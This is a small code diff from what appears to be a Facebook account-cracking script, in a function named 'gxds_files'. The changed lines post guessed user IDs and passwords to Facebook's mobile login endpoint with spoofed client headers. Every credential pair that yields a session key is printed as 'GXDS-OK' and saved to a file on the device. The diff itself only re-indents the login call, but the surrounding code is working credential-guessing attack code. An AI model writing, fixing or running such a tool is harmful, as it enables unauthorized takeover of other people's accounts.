@@ -325,7 +325,7 @@ def gxds_files(uid,pwx):
                     'X-FB-Client-IP': 'True',
                     'X-FB-Server-Cluster': 'True',
                     'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
-                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+            q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
             if "session_key" in q:
                 print(f"\r\r{grn}  [GXDS-OK] {uid}|{ps}")
                 open("/sdcard/gxds-ok.txt","a").write(uid+"|"+ps+"\n")
